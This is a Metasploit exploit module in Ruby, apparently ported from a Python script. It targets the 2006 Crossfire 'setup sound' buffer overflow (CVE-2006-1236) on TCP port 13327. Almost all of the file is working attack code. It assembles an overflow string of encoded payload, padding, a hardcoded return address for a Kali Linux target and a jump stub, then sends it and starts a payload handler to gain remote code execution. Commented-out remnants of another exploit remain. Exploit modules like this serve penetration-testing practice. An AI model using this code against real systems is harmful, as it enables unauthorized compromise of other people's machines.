##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# ported to ruby from https://github.com/Eudoxier/security-utilities/tree/master/python/crossfire by tarxien
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Crossfire SetUp() Remote Buffer Overflow',
      'Description'	=> %q{
        This module exploits a buffer overflow in the "setup sound"
	command of the Crossfire application.
      },
      'Author'	=> [ 'tarxien' ],
      'Arch'		=> ARCH_X86,
      'Platform'	=> 'linux',
      'References'	=>
        [
          [ 'CVE', '2006-1236' ],
          [ 'OSVDB', '2006-1236' ],
          [ 'EDB', '1582' ]
        ],
      'Privileged'	=> false,
      'License'	=> MSF_LICENSE,
      'Payload'	=>
        {
          'Space' => 300,
          'BadChars' => "\x00\x20",
          'StackAdjustment' => -3500,
        },
      'Targets'	=>
        [
          [ 'Kali Linux Rolling', { 'Ret' => 0x08134596 } ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate'  => 'Mar 13 2006'
    ))

    register_options(
      [
        Opt::RPORT(13327)
      ],
      self.class
    )
  end

  def exploit
    connect
	sploit = "\x11(setup sound "
	#sploit << rand_test_alpha_upper(4263)
	sploit << payload.encoded
	sploit << rand_text_alpha_upper(4368 - payload.encoded.length)
	sploit << [target.ret].pack('V')
	sploit << "\x83\xc0\x0c\xff\xe0"
	sploit << "\x90\x90\x90\x00#"
	
#    sploit = "sender="+ payload.encoded + "\r\n"
#    sploit << "client_address=" + [target['Ret']].pack('V') * 300 + "\r\n\r\n"

    sock.put(sploit)
    handler
    disconnect

  end
end
